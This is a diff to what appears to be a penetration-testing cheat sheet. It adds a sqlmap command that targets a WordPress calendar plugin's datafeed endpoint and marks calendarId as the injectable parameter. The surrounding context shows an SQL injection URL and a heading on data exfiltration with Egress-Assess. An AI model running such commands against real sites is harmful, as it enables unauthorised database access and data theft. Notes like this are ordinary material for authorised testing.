@@ -208,6 +208,13 @@ http://site/name.php?henryearl=-1'
 ```
 [Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)
 
+Wordpress Calendar SQL
+```
+sqlmap -u "http://"url"/?action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=remove&rruleType=del_only&calendarId=123" -p calendarId
+```
+The big thing here is the **calendarId**
+
+
 # Data Exfiltration
 ### Egress-Assess
 In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to "root/Tools/Egress-Assess" and run: 
